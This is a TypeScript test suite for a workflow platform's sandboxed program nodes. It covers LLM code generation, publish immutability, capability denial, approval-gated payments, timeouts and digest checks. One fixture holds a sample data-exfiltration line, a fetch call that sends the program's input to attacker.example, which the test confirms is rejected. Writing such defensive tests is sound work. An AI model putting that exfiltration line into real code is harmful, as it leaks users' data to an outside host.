import { Result } from "@praha/byethrow";
import { assert, describe, expect, it } from "vite-plus/test";

import type { ActionType } from "@app/approval-core";
import type { EffectHandler, ProgramCodeGenerator, ProgramDraft } from "@app/workflow-application";
import type {
  CapabilityGrant,
  ProgramNodeReference,
  SandboxAdapter,
  SandboxInvocation,
  WorkflowNode,
} from "@app/workflow-core";
import { definition, edges, f, graph, id, lit, n, obj } from "@app/workflow-core/testing";
import { QuickJsSandbox } from "@app/workflow-sandbox";
import { nodeQuickJsModule } from "@app/workflow-sandbox/node";

import { ORG, createWorkflowHarness } from "../workflow/harness.ts";

/** 同時に動いているsandbox数を数えるwrapper（待機中にprocessを保持しないことの検証用）。 */
class CountingSandbox implements SandboxAdapter {
  active = 0;
  runs = 0;
  private readonly inner = new QuickJsSandbox(nodeQuickJsModule);

  async run(invocation: SandboxInvocation) {
    this.active += 1;
    this.runs += 1;
    const result = await this.inner.run(invocation);
    this.active -= 1;
    return result;
  }
}

/** 自然言語の指示から決まったProgramを返すCoding LLMの代役。 */
const generator: ProgramCodeGenerator = {
  async generate(input) {
    const source = input.instruction.includes("悪意")
      ? `function main(input) { return fetch("https://attacker.example/?" + JSON.stringify(input)); }`
      : `function main(input) {
           const subtotal = input.lines.reduce((sum, line) => sum + line.price * line.qty, 0);
           const discount = subtotal >= 10000 ? Math.round(subtotal * 0.1) : 0;
           return ue.complete({ subtotal, discount, total: subtotal - discount });
         }`;
    return Result.succeed({ source, model: "fake-coder" });
  },
};

const lineSchema = {
  type: "object" as const,
  properties: {
    lines: {
      type: "array" as const,
      items: {
        type: "object" as const,
        properties: { price: { type: "number" as const }, qty: { type: "integer" as const } },
        required: ["price", "qty"],
      },
    },
  },
  required: ["lines"],
};
const totalSchema = {
  type: "object" as const,
  properties: {
    subtotal: { type: "number" as const },
    discount: { type: "number" as const },
    total: { type: "number" as const },
  },
  required: ["subtotal", "discount", "total"],
  additionalProperties: false,
};

const fakeLlm: EffectHandler = {
  async dispatch(context) {
    const request = context.effect.request;
    return Result.succeed(
      request.kind === "llm"
        ? {
            type: "completed" as const,
            output: { text: `summary of ${JSON.stringify(request.prompt)}` },
          }
        : { type: "failed" as const, code: "x", message: "x" },
    );
  },
};

async function harness() {
  const sandbox = new CountingSandbox();
  const h = await createWorkflowHarness({
    primitiveActionTypes: ["payment.execute", "notify.send"],
    platform: { sandbox, codeGenerator: generator, effects: { llm: fakeLlm } },
  });
  assert(h.platform.programAuthoring);
  return { ...h, sandbox, authoring: h.platform.programAuthoring };
}

async function publishProgram(
  h: Awaited<ReturnType<typeof harness>>,
  input: Parameters<NonNullable<Awaited<ReturnType<typeof harness>>["authoring"]>["draft"]>[0],
): Promise<{ reference: ProgramNodeReference; draft: ProgramDraft }> {
  const draft = await h.authoring.draft(input);
  if (Result.isFailure(draft)) expect.fail(draft.error.message);
  expect(draft.value.ready).toBe(true);
  const published = await h.authoring.publish({
    organizationId: ORG,
    draft: draft.value,
    samples: input.samples,
    publishedBy: "user:alice",
  });
  if (Result.isFailure(published)) expect.fail(published.error.message);
  return { reference: published.value.reference, draft: draft.value };
}

function programNode(
  nodeId: string,
  reference: ProgramNodeReference,
  input: ReturnType<typeof obj> | ReturnType<typeof f>,
  capabilities?: CapabilityGrant,
): WorkflowNode {
  return {
    id: id(nodeId),
    type: "program",
    program: reference,
    input,
    ...(capabilities ? { capabilities } : {}),
  } as WorkflowNode;
}

const actionProgramSource = `function main(input, context) {
  if (context.resume === null) {
    return ue.action({ invoice: input.invoice }, "payment.execute", { type: "invoice", id: input.invoice }, { amount: input.amount });
  }
  if (context.resume.effectResult.type !== "completed") return ue.complete({ paid: false });
  if (context.resume.state.summarized === undefined) {
    return ue.llm({ invoice: context.resume.state.invoice, summarized: true }, "fake-model", "summarize payment", 50);
  }
  return ue.complete({ paid: true, invoice: context.resume.state.invoice, note: context.resume.effectResult.output.text });
}`;

describe("WE-160 Sandboxed Program Node / effect-based runtime", () => {
  it("generates a program from natural language, validates it, tests it in the sandbox, and publishes an immutable version", async () => {
    const h = await harness();
    const samples = [
      {
        input: {
          lines: [
            { price: 3000, qty: 2 },
            { price: 5000, qty: 1 },
          ],
        },
        expectedOutput: { subtotal: 11000, discount: 1100, total: 9900 },
      },
      { input: { lines: [{ price: 100, qty: 1 }] } },
    ];
    const { reference, draft } = await publishProgram(h, {
      organizationId: ORG,
      programId: "program:invoice-total",
      instruction: "明細の合計を計算し、1万円以上なら10%割引する",
      inputSchema: lineSchema,
      outputSchema: totalSchema,
      samples,
    });
    expect(draft.generator).toMatchObject({ kind: "llm", model: "fake-coder" });
    expect(draft.generator.instructionDigest).toMatch(/^sha256:/);
    expect(draft.tests.map((test) => test.status)).toEqual(["passed", "passed"]);
    expect(reference).toMatchObject({ programId: "program:invoice-total", version: 1 });

    const stored = await h.platform.repositories.programs.load({
      organizationId: ORG,
      programId: "program:invoice-total",
      version: 1,
    });
    assert(Result.isSuccess(stored) && stored.value);
    const tampered = await h.platform.repositories.programs.save({
      organizationId: ORG,
      version: {
        ...stored.value,
        source: "function main() { return 1; }",
        sourceDigest: "sha256:other",
      },
    });
    expect(Result.isFailure(tampered) && tampered.error.code).toBe("program_version_conflict");
    expect(() => h.db.db.exec("UPDATE workflow_programs SET version_json = '{}'")).toThrow(
      /immutable/,
    );

    const malicious = await h.authoring.draft({
      organizationId: ORG,
      programId: "program:evil",
      instruction: "悪意のある送信",
      inputSchema: { type: "any" },
      outputSchema: { type: "any" },
      samples: [{ input: {} }],
    });
    assert(Result.isSuccess(malicious));
    expect(malicious.value.ready).toBe(false);
    expect(malicious.value.issues.map((issue) => issue.code)).toContain("network_access");
    const rejected = await h.authoring.publish({
      organizationId: ORG,
      draft: malicious.value,
      samples: [{ input: {} }],
      publishedBy: "user:alice",
    });
    expect(Result.isFailure(rejected) && rejected.error.code).toBe("program_not_ready");
  });

  it("runs a pure-transform Program Node inside a workflow with schema validation at the boundary", async () => {
    const h = await harness();
    const { reference } = await publishProgram(h, {
      organizationId: ORG,
      programId: "program:total",
      instruction: "合計",
      inputSchema: lineSchema,
      outputSchema: totalSchema,
      samples: [{ input: { lines: [{ price: 1, qty: 1 }] } }],
    });
    await h.publish(
      definition(
        graph(
          [
            n.trigger(),
            programNode("calc", reference, obj({ lines: f("workflow.input.lines") })),
            n.output(f("nodes.calc.output")),
          ],
          edges("start->calc", "calc->end"),
        ),
        { id: id("wf:calc"), name: "calc" },
      ),
      "invoice.calculate",
    );
    const ok = await h.submit("invoice.calculate", { lines: [{ price: 6000, qty: 2 }] });
    await h.settle();
    expect(await h.result(ok.actionRequestId)).toMatchObject({
      status: "executed",
      result: { output: { subtotal: 12000, discount: 1200, total: 10800 } },
    });

    const invalid = await h.submit("invoice.calculate", { lines: "not-an-array" }, "INV-2");
    await h.settle();
    expect(await h.result(invalid.actionRequestId)).toMatchObject({
      status: "execution_failed",
      code: "program_input_invalid",
    });
  });

  it("requests Action / LLM capabilities only via effects and holds no sandbox while waiting", async () => {
    const h = await harness();
    await h.requireApproval("payment.execute");
    const { reference } = await publishProgram(h, {
      organizationId: ORG,
      programId: "program:pay",
      source: actionProgramSource,
      inputSchema: {
        type: "object",
        properties: { invoice: { type: "string" }, amount: { type: "number" } },
        required: ["invoice", "amount"],
      },
      outputSchema: { type: "object" },
      requestedCapabilities: {
        actions: [{ actionType: "payment.execute", resourceType: "invoice" }],
        llm: {
          models: ["fake-model"],
          maxCalls: 1,
          maxInputTokens: 1000,
          maxOutputTokens: 50,
          maxCostMicroUsd: 100,
        },
      },
      samples: [{ input: { invoice: "INV-0", amount: 1 } }],
    });
    await h.publish(
      definition(
        graph(
          [
            n.trigger(),
            programNode(
              "pay",
              reference,
              obj({ invoice: f("workflow.input.invoice"), amount: f("workflow.input.amount") }),
              {
                actions: [
                  { actionType: id<ActionType>("payment.execute"), resourceType: "invoice" },
                ],
                llm: {
                  models: ["fake-model"],
                  maxCalls: 1,
                  maxInputTokens: 1000,
                  maxOutputTokens: 50,
                  maxCostMicroUsd: 100,
                },
              },
            ),
            n.output(f("nodes.pay.output")),
          ],
          edges("start->pay", "pay->end"),
        ),
        { id: id("wf:program-pay"), name: "program pay" },
      ),
      "invoice.pay",
    );
    const parent = await h.submit("invoice.pay", { invoice: "INV-9", amount: 5000 });
    await h.settle();
    const run = await h.runOf(parent.actionRequestId);
    expect(run.state.nodeRuns["root:pay"]).toMatchObject({
      status: "waiting",
      waitingReason: "waiting_approval",
      programState: { invoice: "INV-9" },
    });
    // 承認待ちの間、sandboxは1つも動いていない（persisted stateだけを保持する）。
    expect(h.sandbox.active).toBe(0);
    const [child] = await h.children(run.state.runId);
    assert(child);
    const childPlan = await h.loadPlan(child.childActionRequestId);
    expect(childPlan.evaluationSnapshot.actor.id).toBe("workflow:wf:program-pay/node:pay");
    expect(childPlan.action).toMatchObject({ type: "payment.execute", input: { amount: 5000 } });

    await h.approve(child.childActionRequestId);
    expect(await h.status(parent.actionRequestId)).toBe("executed");
    expect(await h.result(parent.actionRequestId)).toMatchObject({
      result: { output: { paid: true, invoice: "INV-9", note: 'summary of "summarize payment"' } },
    });
    // 初回 + action結果での再開 + llm結果での再開 = 3 sandbox invocation（毎回ephemeral）。
    expect(h.sandbox.active).toBe(0);
    expect(h.sandbox.runs).toBeGreaterThanOrEqual(3);
  });

  it("denies capabilities the program did not declare or the node was not granted (fail-closed)", async () => {
    const h = await harness();
    const undeclared = await publishProgram(h, {
      organizationId: ORG,
      programId: "program:undeclared",
      source: `function main() { return ue.complete(1); }`,
      inputSchema: { type: "any" },
      outputSchema: { type: "any" },
      samples: [{ input: {} }],
    });
    // publish後にsourceは変えられないため、宣言外の作用を要求するprogramは別に作る。
    const sneaky = await publishProgram(h, {
      organizationId: ORG,
      programId: "program:sneaky",
      source: `function main(input, context) {
        if (context.resume === null && input.go) return ue.action({}, "payment.execute", { type: "invoice", id: "X" }, {});
        return ue.complete("done");
      }`,
      inputSchema: { type: "any" },
      outputSchema: { type: "any" },
      samples: [{ input: { go: false } }],
    });
    const grantedButUndeclared = { actions: [{ actionType: id<ActionType>("payment.execute") }] };
    await h.publish(
      definition(
        graph(
          [
            n.trigger(),
            programNode("sneak", sneaky.reference, obj({ go: lit(true) }), grantedButUndeclared),
            n.output(lit(null)),
          ],
          edges("start->sneak", "sneak->end"),
        ),
        { id: id("wf:sneaky"), name: "sneaky" },
      ),
      "sneaky.run",
    );
    const sneakyRun = await h.submit("sneaky.run", {});
    await h.settle();
    expect(await h.result(sneakyRun.actionRequestId)).toMatchObject({
      status: "execution_failed",
      code: "capability_denied",
    });

    const declared = await publishProgram(h, {
      organizationId: ORG,
      programId: "program:declared",
      source: `function main(input, context) {
        if (context.resume === null) return ue.action({}, "payment.execute", { type: "invoice", id: "X" }, {});
        return ue.complete("done");
      }`,
      inputSchema: { type: "any" },
      outputSchema: { type: "any" },
      requestedCapabilities: { actions: [{ actionType: "payment.execute" }] },
      samples: [{ input: {} }],
    });
    // Node grantに無ければ、programが要求（manifest）していても実行できない（自己grant不可）。
    await h.publish(
      definition(
        graph(
          [
            n.trigger(),
            programNode("pay", declared.reference, obj({}), {
              actions: [{ actionType: id<ActionType>("notify.send") }],
            }),
            n.output(lit(null)),
          ],
          edges("start->pay", "pay->end"),
        ),
        { id: id("wf:not-granted"), name: "not granted" },
      ),
      "not.granted",
    );
    const notGranted = await h.submit("not.granted", {});
    await h.settle();
    expect(await h.result(notGranted.actionRequestId)).toMatchObject({
      status: "execution_failed",
      code: "capability_denied",
    });
    expect(h.executor.calls.map((call) => String(call.action.type))).not.toContain(
      "payment.execute",
    );
    void undeclared;
  });

  it("terminates runaway programs and rejects digest substitution", async () => {
    const h = await harness();
    const runaway = await publishProgram(h, {
      organizationId: ORG,
      programId: "program:runaway",
      source: `function main(input) { if (input.spin) { while (true) {} } return ue.complete(0); }`,
      inputSchema: { type: "any" },
      outputSchema: { type: "any" },
      runtimeProfile: { timeoutMs: 100 },
      samples: [{ input: { spin: false } }],
    });
    await h.publish(
      definition(
        graph(
          [
            n.trigger(),
            programNode("spin", runaway.reference, obj({ spin: lit(true) })),
            n.output(lit(null)),
          ],
          edges("start->spin", "spin->end"),
        ),
        { id: id("wf:runaway"), name: "runaway" },
      ),
      "runaway.run",
    );
    const spun = await h.submit("runaway.run", {});
    await h.settle();
    expect(await h.result(spun.actionRequestId)).toMatchObject({
      status: "execution_failed",
      code: "sandbox_timeout",
    });

    const substituted = {
      ...runaway.reference,
      sourceDigest: id<ProgramNodeReference["sourceDigest"]>("sha256:substituted"),
    };
    await h.publish(
      definition(
        graph(
          [n.trigger(), programNode("spin", substituted, obj({})), n.output(lit(null))],
          edges("start->spin", "spin->end"),
        ),
        { id: id("wf:substituted"), name: "substituted" },
      ),
      "substituted.run",
    );
    const bad = await h.submit("substituted.run", {});
    await h.settle();
    expect(await h.result(bad.actionRequestId)).toMatchObject({
      status: "execution_failed",
      code: "program_digest_mismatch",
    });
  });
});
